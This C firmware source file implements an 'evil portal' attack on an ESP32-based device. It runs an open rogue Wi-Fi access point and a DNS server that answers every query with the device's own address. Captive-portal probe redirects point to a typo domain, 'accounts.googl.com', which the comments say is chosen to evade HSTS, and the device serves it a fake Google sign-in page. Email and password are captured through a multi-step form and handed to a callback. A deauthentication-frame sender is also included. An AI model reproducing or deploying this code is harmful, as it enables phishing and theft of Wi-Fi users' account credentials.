#include "wifi_hal.h"
#include "evil_portal_html.h"

#include <string.h>
#include <stdlib.h>
#include <esp_wifi.h>
#include <esp_netif.h>
#include <esp_event.h>
#include <esp_log.h>
#include <esp_http_server.h>
#include <esp_heap_caps.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <lwip/sockets.h>
#include <lwip/inet.h>
#include <furi.h>
#include <btshim.h>

#define TAG "EvilPortal"
#define DNS_PORT 53
#define DNS_TASK_STACK 3072
#define DEAUTH_TASK_STACK 3072

static volatile bool s_running = false;
static volatile bool s_dns_run = false;
static volatile bool s_deauth_run = false;
static bool s_bt_was_on = false;
static bool s_event_handlers_registered = false;

static void evil_ap_event_handler(void* arg, esp_event_base_t event_base, int32_t event_id, void* event_data) {
    (void)arg;
    if(event_base == WIFI_EVENT) {
        if(event_id == WIFI_EVENT_AP_STACONNECTED) {
            wifi_event_ap_staconnected_t* e = event_data;
            ESP_LOGI(TAG, "AP_STACONNECTED %02x:%02x:%02x:%02x:%02x:%02x aid=%u",
                     e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->aid);
        } else if(event_id == WIFI_EVENT_AP_STADISCONNECTED) {
            wifi_event_ap_stadisconnected_t* e = event_data;
            ESP_LOGI(TAG, "AP_STADISCONNECTED %02x:%02x:%02x:%02x:%02x:%02x reason=%u",
                     e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5], e->reason);
        } else if(event_id == WIFI_EVENT_AP_START) {
            ESP_LOGI(TAG, "AP_START");
        } else if(event_id == WIFI_EVENT_AP_STOP) {
            ESP_LOGI(TAG, "AP_STOP");
        }
    } else if(event_base == IP_EVENT && event_id == IP_EVENT_AP_STAIPASSIGNED) {
        ip_event_ap_staipassigned_t* e = event_data;
        uint32_t ip = e->ip.addr;
        ESP_LOGI(TAG, "AP_STAIPASSIGNED %u.%u.%u.%u",
                 (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff),
                 (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
    }
}
static TaskHandle_t s_dns_task = NULL;
static TaskHandle_t s_deauth_task = NULL;
static httpd_handle_t s_http = NULL;
static esp_netif_t* s_ap_netif = NULL;
static int s_dns_socket = -1;

static uint32_t s_cred_count = 0;
static uint8_t s_channel = 1;

static WifiHalEvilPortalCredCb s_cred_cb = NULL;
static void* s_cred_cb_ctx = NULL;

static char* s_html_buf = NULL;
static size_t s_html_len = 0;

static const uint8_t deauth_template[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00,
};

static int hex_decode_char(char c) {
    if(c >= '0' && c <= '9') return c - '0';
    if(c >= 'a' && c <= 'f') return c - 'a' + 10;
    if(c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void url_decode(char* s) {
    char* w = s;
    char* r = s;
    while(*r) {
        if(*r == '+') {
            *w++ = ' ';
            r++;
        } else if(*r == '%' && r[1] && r[2]) {
            int hi = hex_decode_char(r[1]);
            int lo = hex_decode_char(r[2]);
            if(hi >= 0 && lo >= 0) {
                *w++ = (char)((hi << 4) | lo);
                r += 3;
            } else {
                *w++ = *r++;
            }
        } else {
            *w++ = *r++;
        }
    }
    *w = 0;
}

static bool extract_field(const char* body, const char* key, char* out, size_t out_size) {
    size_t klen = strlen(key);
    const char* p = body;
    while((p = strstr(p, key)) != NULL) {
        if((p == body || *(p - 1) == '&') && p[klen] == '=') {
            const char* val = p + klen + 1;
            const char* end = strchr(val, '&');
            size_t vlen = end ? (size_t)(end - val) : strlen(val);
            if(vlen >= out_size) vlen = out_size - 1;
            memcpy(out, val, vlen);
            out[vlen] = 0;
            url_decode(out);
            return true;
        }
        p += klen;
    }
    return false;
}

static void log_req_headers(httpd_req_t* req, const char* tag) {
    char val[160];
    if(httpd_req_get_hdr_value_str(req, "Host", val, sizeof(val)) == ESP_OK) {
        ESP_LOGI(TAG, "  %s Host: %s", tag, val);
    }
    if(httpd_req_get_hdr_value_str(req, "User-Agent", val, sizeof(val)) == ESP_OK) {
        ESP_LOGI(TAG, "  %s UA:   %s", tag, val);
    }
    if(httpd_req_get_hdr_value_str(req, "Accept", val, sizeof(val)) == ESP_OK) {
        ESP_LOGI(TAG, "  %s Acc:  %s", tag, val);
    }
}

static esp_err_t handler_root(httpd_req_t* req) {
    ESP_LOGI(TAG, "GET %s", req->uri);
    log_req_headers(req, "root");
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
                    s_html_buf ? s_html_len : EVIL_PORTAL_HTML_GOOGLE_LEN);
    return ESP_OK;
}

static esp_err_t handler_redirect(httpd_req_t* req) {
    ESP_LOGI(TAG, "probe-redirect %s -> http://172.0.0.1/", req->uri);
    log_req_headers(req, "probe");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://172.0.0.1/");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

// Captive-portal probe URLs (Android/Windows/Firefox): 302 to a Google-like
// typo domain. The DNS hijack resolves anything to the AP IP, so the follow-up
// GET hits us with Host: accounts.googl.com -- handler_root then serves the
// portal HTML and the address bar shows accounts.googl.com instead of e.g.
// connectivitycheck.gstatic.com. We use a typo (no second "e") rather than
// real google.com because every google.com subdomain is HSTS-preloaded which
// would force the browser to HTTPS.
static esp_err_t handler_probe_to_google(httpd_req_t* req) {
    static const char location[] = "http://accounts.googl.com/";
    ESP_LOGI(TAG, "probe-redirect %s -> %s", req->uri, location);
    log_req_headers(req, "probe");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", location);
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static esp_err_t handler_hotspot_apple(httpd_req_t* req) {
    ESP_LOGI(TAG, "probe-apple %s -> meta-refresh", req->uri);
    static const char body[] =
        "<HTML><HEAD>"
        "<META http-equiv=\"refresh\" content=\"0;url=http://172.0.0.1/\">"
        "</HEAD><BODY>Captive</BODY></HTML>";
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, body, sizeof(body) - 1);
    return ESP_OK;
}

static void send_step2_with_email(httpd_req_t* req, const char* email) {
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");

    static const char marker[] = "%EMAIL%";
    const size_t marker_len = sizeof(marker) - 1;
    const size_t email_len = strlen(email);
    const char* p = EVIL_PORTAL_HTML_GOOGLE_STEP2_TPL;

    while(*p) {
        const char* hit = strstr(p, marker);
        if(!hit) {
            httpd_resp_send_chunk(req, p, strlen(p));
            break;
        }
        if(hit > p) {
            httpd_resp_send_chunk(req, p, hit - p);
        }
        if(email_len > 0) {
            httpd_resp_send_chunk(req, email, email_len);
        }
        p = hit + marker_len;
    }
    httpd_resp_send_chunk(req, NULL, 0);
}

static esp_err_t handler_post(httpd_req_t* req) {
    ESP_LOGI(TAG, "POST %s content_len=%u", req->uri, (unsigned)req->content_len);
    char body[512];
    int total = 0;
    int remaining = req->content_len;
    if(remaining > (int)sizeof(body) - 1) remaining = sizeof(body) - 1;
    while(remaining > 0) {
        int r = httpd_req_recv(req, body + total, remaining);
        if(r <= 0) {
            if(r == HTTPD_SOCK_ERR_TIMEOUT) continue;
            return ESP_FAIL;
        }
        total += r;
        remaining -= r;
    }
    body[total] = 0;

    char step[4] = {0};
    extract_field(body, "step", step, sizeof(step));

    char user[64] = {0};
    char pwd[64] = {0};

    if(!extract_field(body, "email", user, sizeof(user))) {
        if(!extract_field(body, "username", user, sizeof(user))) {
            extract_field(body, "user", user, sizeof(user));
        }
    }
    if(!extract_field(body, "password", pwd, sizeof(pwd))) {
        extract_field(body, "pass", pwd, sizeof(pwd));
    }

    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");

    // Google 3-step flow: step=1 carries only email -> render step 2 with the
    // entered email substituted in, no credentials captured yet.
    if(strcmp(step, "1") == 0 && user[0] && !pwd[0]) {
        ESP_LOGI(TAG, "google step1: email=%s -> rendering step2", user);
        send_step2_with_email(req, user);
        return ESP_OK;
    }

    // step=2 (or any single-step template like Router) -> capture credentials.
    if(user[0] || pwd[0]) {
        s_cred_count++;
        ESP_LOGI(TAG, "Captured: %s / %s", user, pwd[0] ? "***" : "(empty)");
        if(s_cred_cb) s_cred_cb(user, pwd, s_cred_cb_ctx);
    }

    if(strcmp(step, "2") == 0) {
        httpd_resp_send(req, EVIL_PORTAL_HTML_GOOGLE_FAILED, EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN);
    } else {
        httpd_resp_send(req, EVIL_PORTAL_HTML_LOADING, EVIL_PORTAL_HTML_LOADING_LEN);
    }
    return ESP_OK;
}

static esp_err_t handler_catch_all(httpd_req_t* req, httpd_err_code_t err) {
    (void)err;
    ESP_LOGI(TAG, "catch-all %s -> serve portal", req->uri);
    log_req_headers(req, "catch");
    httpd_resp_set_type(req, "text/html");
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
                    s_html_buf ? s_html_len : EVIL_PORTAL_HTML_GOOGLE_LEN);
    return ESP_OK;
}

static const httpd_uri_t uri_root_get = {
    .uri = "/", .method = HTTP_GET, .handler = handler_root, .user_ctx = NULL};
static const httpd_uri_t uri_post_post = {
    .uri = "/post", .method = HTTP_POST, .handler = handler_post, .user_ctx = NULL};
static const httpd_uri_t uri_post_get = {
    .uri = "/post", .method = HTTP_GET, .handler = handler_post, .user_ctx = NULL};

static const char* probe_uris[] = {
    "/generate_204",
    "/gen_204",
    "/ncsi.txt",
    "/connecttest.txt",
    "/success.txt",
    "/canonical.html",
    "/fwlink",
    "/redirect",
};

static esp_err_t http_open_cb(httpd_handle_t hd, int sockfd) {
    (void)hd;
    struct sockaddr_in6 addr;
    socklen_t addr_len = sizeof(addr);
    char ip_str[40] = "?";
    uint16_t port = 0;
    if(getpeername(sockfd, (struct sockaddr*)&addr, &addr_len) == 0) {
        if(addr.sin6_family == AF_INET6) {
            struct sockaddr_in* a4 = (struct sockaddr_in*)&addr;
            uint32_t ip = a4->sin_addr.s_addr;
            snprintf(ip_str, sizeof(ip_str), "%u.%u.%u.%u",
                     (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff),
                     (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
            port = ntohs(a4->sin_port);
        }
    }
    ESP_LOGI(TAG, "TCP open  fd=%d from %s:%u", sockfd, ip_str, port);
    return ESP_OK;
}

static void http_close_cb(httpd_handle_t hd, int sockfd) {
    (void)hd;
    ESP_LOGI(TAG, "TCP close fd=%d", sockfd);
    close(sockfd);
}

static bool start_http(void) {
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_uri_handlers = 16;
    config.max_open_sockets = 7;
    config.uri_match_fn = httpd_uri_match_wildcard;
    config.lru_purge_enable = true;
    config.open_fn = http_open_cb;
    config.close_fn = http_close_cb;

    ESP_LOGI(TAG, "httpd_start: port=%u max_uri=%u max_sockets=%u",
             config.server_port, config.max_uri_handlers, config.max_open_sockets);
    if(httpd_start(&s_http, &config) != ESP_OK) {
        ESP_LOGE(TAG, "httpd_start failed");
        return false;
    }
    ESP_LOGI(TAG, "httpd_start OK, handle=%p", s_http);
    httpd_register_uri_handler(s_http, &uri_root_get);
    httpd_register_uri_handler(s_http, &uri_post_post);
    httpd_register_uri_handler(s_http, &uri_post_get);

    // Probe URLs (Android, Windows, Firefox) -> 302 redirect so the address
    // bar shows accounts.googl.com instead of the probe host (e.g.
    // connectivitycheck.gstatic.com). DNS hijack resolves the typo domain to
    // our AP IP, then handler_root serves the portal on the follow-up GET.
    for(size_t i = 0; i < sizeof(probe_uris) / sizeof(probe_uris[0]); i++) {
        httpd_uri_t u = {
            .uri = probe_uris[i], .method = HTTP_GET, .handler = handler_probe_to_google, .user_ctx = NULL};
        httpd_register_uri_handler(s_http, &u);
    }

    static const httpd_uri_t uri_apple = {
        .uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = handler_hotspot_apple, .user_ctx = NULL};
    static const httpd_uri_t uri_apple_lib = {
        .uri = "/library/test/success.html", .method = HTTP_GET, .handler = handler_hotspot_apple, .user_ctx = NULL};
    httpd_register_uri_handler(s_http, &uri_apple);
    httpd_register_uri_handler(s_http, &uri_apple_lib);

    httpd_register_err_handler(s_http, HTTPD_404_NOT_FOUND, handler_catch_all);
    // Also serve the portal on header-too-long / URL-too-long errors instead
    // of returning 431/414 (smartphones send big cookie blobs to captive APs).
    httpd_register_err_handler(s_http, HTTPD_400_BAD_REQUEST, handler_catch_all);
    httpd_register_err_handler(s_http, HTTPD_414_URI_TOO_LONG, handler_catch_all);
    httpd_register_err_handler(s_http, HTTPD_431_REQ_HDR_FIELDS_TOO_LARGE, handler_catch_all);
    return true;
}

static void stop_http(void) {
    if(s_http) {
        httpd_stop(s_http);
        s_http = NULL;
    }
}

static void dns_task(void* arg) {
    (void)arg;

    ESP_LOGI(TAG, "DNS task entry");
    s_dns_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(s_dns_socket < 0) {
        ESP_LOGE(TAG, "DNS socket failed");
        s_dns_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DNS_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if(bind(s_dns_socket, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        ESP_LOGE(TAG, "DNS bind failed");
        close(s_dns_socket);
        s_dns_socket = -1;
        s_dns_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    struct timeval tv = {.tv_sec = 0, .tv_usec = 200000};
    setsockopt(s_dns_socket, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    uint32_t ap_ip = 0;
    {
        esp_netif_ip_info_t info;
        if(s_ap_netif && esp_netif_get_ip_info(s_ap_netif, &info) == ESP_OK) {
            ap_ip = info.ip.addr;
        } else {
            ap_ip = htonl(0xAC000001); // 172.0.0.1
        }
        ESP_LOGI(TAG, "DNS bound, redirecting to %u.%u.%u.%u",
                 (unsigned)(ap_ip & 0xff), (unsigned)((ap_ip >> 8) & 0xff),
                 (unsigned)((ap_ip >> 16) & 0xff), (unsigned)((ap_ip >> 24) & 0xff));
    }

    uint8_t buf[512];
    char domain[128];
    while(s_dns_run) {
        struct sockaddr_in src;
        socklen_t slen = sizeof(src);
        int n = recvfrom(s_dns_socket, buf, sizeof(buf), 0, (struct sockaddr*)&src, &slen);
        if(n < 12) continue;

        // Only handle standard queries (OPCODE=0, QR=0)
        if((buf[2] & 0xF8) != 0x00) continue;

        // Find end of QName
        int p = 12;
        size_t dlen = 0;
        while(p < n && buf[p] != 0) {
            uint8_t lbl = buf[p];
            if(lbl >= 0xC0) break; // compressed name not expected in question
            if(p + 1 + lbl > n) { p = n; break; }
            if(dlen) { if(dlen < sizeof(domain) - 1) domain[dlen++] = '.'; }
            for(int i = 0; i < lbl && dlen < sizeof(domain) - 1; i++) {
                domain[dlen++] = buf[p + 1 + i];
            }
            p += lbl + 1;
        }
        domain[dlen] = 0;
        if(p >= n || buf[p] != 0) continue;
        if(p + 5 > n) continue; // need null + QType + QClass

        uint16_t qtype = (buf[p + 1] << 8) | buf[p + 2];
        int qend = p + 1 + 4;

        bool is_a = (qtype == 1 || qtype == 255);

        // Like Arduino's DNSServer: only flip QR bit and set ANCount,
        // keep OPCode/RD and other flags from the original request.
        buf[2] |= 0x80;            // QR = response
        buf[6] = 0; buf[7] = is_a ? 1 : 0; // ANCount
        buf[8] = 0; buf[9] = 0;            // NSCount
        buf[10] = 0; buf[11] = 0;          // ARCount

        int total;
        if(is_a) {
            if(qend + 16 > (int)sizeof(buf)) continue;
            buf[qend + 0]  = 0xC0;
            buf[qend + 1]  = 0x0C;        // pointer to QName
            buf[qend + 2]  = 0x00;
            buf[qend + 3]  = 0x01;        // Type A
            buf[qend + 4]  = 0x00;
            buf[qend + 5]  = 0x01;        // Class IN
            buf[qend + 6]  = 0x00;
            buf[qend + 7]  = 0x00;
            buf[qend + 8]  = 0x00;
            buf[qend + 9]  = 0x3C;        // TTL 60s
            buf[qend + 10] = 0x00;
            buf[qend + 11] = 0x04;        // RDLENGTH = 4
            memcpy(&buf[qend + 12], &ap_ip, 4);
            total = qend + 16;
        } else {
            // For non-A queries: empty answer, just header + question
            total = qend;
        }

        ESP_LOGI(TAG, "DNS q='%s' type=%u -> %s",
                 domain, qtype, is_a ? "A" : "empty");

        sendto(s_dns_socket, buf, total, 0, (struct sockaddr*)&src, slen);
    }

    close(s_dns_socket);
    s_dns_socket = -1;
    s_dns_task = NULL;
    vTaskDelete(NULL);
}

static void deauth_task(void* arg) {
    (void)arg;
    uint8_t pkt[26];
    uint8_t bssid[6];
    if(esp_wifi_get_mac(WIFI_IF_AP, bssid) != ESP_OK) {
        memset(bssid, 0, 6);
    }

    while(s_deauth_run) {
        memcpy(pkt, deauth_template, sizeof(pkt));
        memcpy(&pkt[10], bssid, 6);
        memcpy(&pkt[16], bssid, 6);
        esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
        vTaskDelay(pdMS_TO_TICKS(250));
    }
    s_deauth_task = NULL;
    vTaskDelete(NULL);
}

typedef struct {
    const WifiHalEvilPortalConfig* cfg;
    bool result;
} EpStartArgs;

static void evil_portal_start_worker(void* arg) {
    EpStartArgs* sa = arg;
    const WifiHalEvilPortalConfig* cfg = sa->cfg;
    sa->result = false;

    ESP_LOGI(TAG, "[worker] start: ssid='%s' ch=%u deauth=%d html_len=%u",
             cfg->ssid, cfg->channel, cfg->deauth_enabled, (unsigned)cfg->html_len);

    static bool s_netif_done = false;
    if(!s_netif_done) {
        ESP_LOGI(TAG, "[worker] esp_netif_init + event loop");
        esp_netif_init();
        esp_err_t evl = esp_event_loop_create_default();
        if(evl != ESP_OK && evl != ESP_ERR_INVALID_STATE) {
            ESP_LOGW(TAG, "  event_loop_create: %s", esp_err_to_name(evl));
        }
        s_netif_done = true;
    }

    if(!s_ap_netif) {
        ESP_LOGI(TAG, "[worker] creating default AP netif");
        s_ap_netif = esp_netif_create_default_wifi_ap();
        if(!s_ap_netif) {
            ESP_LOGE(TAG, "  AP netif alloc FAILED");
            return;
        }
        // Set AP gateway/netmask to 172.0.0.1/24 (matches Bruce default)
        esp_netif_dhcps_stop(s_ap_netif);
        esp_netif_ip_info_t ip_info = {0};
        IP4_ADDR(&ip_info.ip, 172, 0, 0, 1);
        IP4_ADDR(&ip_info.gw, 172, 0, 0, 1);
        IP4_ADDR(&ip_info.netmask, 255, 255, 255, 0);
        esp_err_t ip_err = esp_netif_set_ip_info(s_ap_netif, &ip_info);
        ESP_LOGI(TAG, "[worker] AP IP set to 172.0.0.1/24: %s", esp_err_to_name(ip_err));
    }

    ESP_LOGI(TAG, "[worker] esp_wifi_init");
    wifi_init_config_t wcfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t err = esp_wifi_init(&wcfg);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  wifi_init: %s", esp_err_to_name(err));
        return;
    }
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    wifi_config_t ap_cfg = {0};
    strncpy((char*)ap_cfg.ap.ssid, cfg->ssid, 32);
    ap_cfg.ap.ssid_len = strlen(cfg->ssid);
    ap_cfg.ap.channel = cfg->channel ? cfg->channel : 1;
    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.beacon_interval = 100;

    ESP_LOGI(TAG, "[worker] esp_wifi_set_mode(AP)");
    err = esp_wifi_set_mode(WIFI_MODE_AP);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  set_mode: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    ESP_LOGI(TAG, "[worker] esp_wifi_set_config: ssid='%s' ch=%u", cfg->ssid, ap_cfg.ap.channel);
    err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  set_config: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    if(!s_event_handlers_registered) {
        esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &evil_ap_event_handler, NULL);
        esp_event_handler_register(IP_EVENT, IP_EVENT_AP_STAIPASSIGNED, &evil_ap_event_handler, NULL);
        s_event_handlers_registered = true;
        ESP_LOGI(TAG, "[worker] AP/IP event handlers registered");
    }

    ESP_LOGI(TAG, "[worker] esp_wifi_start");
    err = esp_wifi_start();
    if(err != ESP_OK) {
        ESP_LOGE(TAG, "  wifi_start: %s", esp_err_to_name(err));
        esp_wifi_deinit();
        return;
    }

    vTaskDelay(pdMS_TO_TICKS(200));

    {
        // Stop DHCPS so we can set captive-portal URI (RFC 8910 / DHCP option 114)
        // which iOS 14+/Android 11+ use to open the CNA window directly.
        esp_netif_dhcps_stop(s_ap_netif);

        static char captive_url[] = "http://172.0.0.1/";
        esp_err_t cp = esp_netif_dhcps_option(
            s_ap_netif, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI,
            captive_url, sizeof(captive_url) - 1);
        ESP_LOGI(TAG, "[worker] DHCP option 114 set: %s url=%s",
                 esp_err_to_name(cp), captive_url);

        esp_err_t s = esp_netif_dhcps_start(s_ap_netif);
        ESP_LOGI(TAG, "[worker] DHCPS started: %s", esp_err_to_name(s));
    }

    s_channel = ap_cfg.ap.channel;
    s_cred_cb = cfg->cred_cb;
    s_cred_cb_ctx = cfg->cred_cb_ctx;
    s_cred_count = 0;

    if(s_html_buf) {
        free(s_html_buf);
        s_html_buf = NULL;
        s_html_len = 0;
    }
    if(cfg->html && cfg->html_len > 0) {
        s_html_buf = malloc(cfg->html_len + 1);
        if(s_html_buf) {
            memcpy(s_html_buf, cfg->html, cfg->html_len);
            s_html_buf[cfg->html_len] = 0;
            s_html_len = cfg->html_len;
            ESP_LOGI(TAG, "[worker] HTML buffered: %u bytes", (unsigned)s_html_len);
        } else {
            ESP_LOGE(TAG, "[worker] HTML buffer alloc failed");
        }
    }

    ESP_LOGI(TAG, "[worker] starting HTTP server");
    if(!start_http()) {
        esp_wifi_stop();
        esp_wifi_deinit();
        return;
    }

    ESP_LOGI(TAG, "[worker] starting DNS task");
    s_dns_run = true;
    if(xTaskCreate(dns_task, "EpDns", DNS_TASK_STACK, NULL, 4, &s_dns_task) != pdPASS) {
        ESP_LOGE(TAG, "  DNS task create FAILED");
        s_dns_run = false;
        stop_http();
        esp_wifi_stop();
        esp_wifi_deinit();
        return;
    }

    if(cfg->deauth_enabled) {
        ESP_LOGI(TAG, "[worker] starting deauth task");
        s_deauth_run = true;
        xTaskCreate(deauth_task, "EpDeauth", DEAUTH_TASK_STACK, NULL, 4, &s_deauth_task);
    }

    s_running = true;
    sa->result = true;

    esp_netif_ip_info_t info;
    if(s_ap_netif && esp_netif_get_ip_info(s_ap_netif, &info) == ESP_OK) {
        uint32_t ip = info.ip.addr;
        ESP_LOGI(TAG, "[worker] AP IP=%u.%u.%u.%u",
                 (unsigned)(ip & 0xff), (unsigned)((ip >> 8) & 0xff),
                 (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
    }

    ESP_LOGI(TAG, "[worker] Evil Portal ACTIVE: SSID='%s' Ch=%u Deauth=%d",
             cfg->ssid, ap_cfg.ap.channel, cfg->deauth_enabled);
}

bool wifi_hal_evil_portal_start(const WifiHalEvilPortalConfig* cfg) {
    if(!cfg || !cfg->ssid || !cfg->ssid[0]) {
        ESP_LOGE(TAG, "start: invalid config");
        return false;
    }
    if(s_running) {
        ESP_LOGW(TAG, "start: already running");
        return false;
    }

    if(wifi_hal_is_started()) {
        ESP_LOGI(TAG, "start: stopping STA mode first");
        wifi_hal_stop();
    }

    Bt* bt = furi_record_open(RECORD_BT);
    s_bt_was_on = bt_is_enabled(bt);
    if(s_bt_was_on) {
        ESP_LOGI(TAG, "start: stopping BLE stack to free RAM");
        bt_stop_stack(bt);
    }
    furi_record_close(RECORD_BT);

    ESP_LOGI(TAG, "start: free internal heap before init: %lu",
             (unsigned long)heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT));

    EpStartArgs sa = {.cfg = cfg, .result = false};
    if(!wifi_hal_run_in_worker(evil_portal_start_worker, &sa)) {
        ESP_LOGE(TAG, "start: worker dispatch failed");
        if(s_bt_was_on) {
            Bt* bt2 = furi_record_open(RECORD_BT);
            bt_start_stack(bt2);
            furi_record_close(RECORD_BT);
            s_bt_was_on = false;
        }
        return false;
    }
    if(!sa.result && s_bt_was_on) {
        ESP_LOGW(TAG, "start: failed in worker, restoring BLE");
        Bt* bt2 = furi_record_open(RECORD_BT);
        bt_start_stack(bt2);
        furi_record_close(RECORD_BT);
        s_bt_was_on = false;
    }
    return sa.result;
}

static void evil_portal_stop_worker(void* arg) {
    (void)arg;
    ESP_LOGI(TAG, "[worker] stopping Evil Portal");

    if(s_deauth_run) {
        ESP_LOGI(TAG, "[worker]   stopping deauth task");
        s_deauth_run = false;
        while(s_deauth_task) vTaskDelay(pdMS_TO_TICKS(10));
    }

    ESP_LOGI(TAG, "[worker]   stopping DNS task");
    s_dns_run = false;
    while(s_dns_task) vTaskDelay(pdMS_TO_TICKS(10));

    ESP_LOGI(TAG, "[worker]   stopping HTTP server");
    stop_http();

    ESP_LOGI(TAG, "[worker]   esp_wifi_stop + deinit");
    esp_wifi_stop();
    esp_wifi_deinit();

    if(s_html_buf) {
        free(s_html_buf);
        s_html_buf = NULL;
        s_html_len = 0;
    }
    s_cred_cb = NULL;
    s_cred_cb_ctx = NULL;
    s_running = false;
    ESP_LOGI(TAG, "[worker] Evil Portal STOPPED");
}

void wifi_hal_evil_portal_stop(void) {
    if(!s_running) {
        ESP_LOGI(TAG, "stop: not running");
        return;
    }
    wifi_hal_run_in_worker(evil_portal_stop_worker, NULL);

    if(s_bt_was_on) {
        ESP_LOGI(TAG, "stop: restoring BLE stack");
        Bt* bt = furi_record_open(RECORD_BT);
        bt_start_stack(bt);
        furi_record_close(RECORD_BT);
        s_bt_was_on = false;
    }
}

bool wifi_hal_evil_portal_is_running(void) {
    return s_running;
}

uint32_t wifi_hal_evil_portal_get_cred_count(void) {
    return s_cred_count;
}

typedef struct {
    uint16_t count;
} EpClientArgs;

static void evil_portal_get_clients_worker(void* arg) {
    EpClientArgs* a = arg;
    wifi_sta_list_t list;
    if(esp_wifi_ap_get_sta_list(&list) != ESP_OK) {
        a->count = 0;
        return;
    }
    a->count = (uint16_t)list.num;
}

uint16_t wifi_hal_evil_portal_get_client_count(void) {
    if(!s_running) return 0;
    EpClientArgs a = {.count = 0};
    wifi_hal_run_in_worker(evil_portal_get_clients_worker, &a);
    return a.count;
}
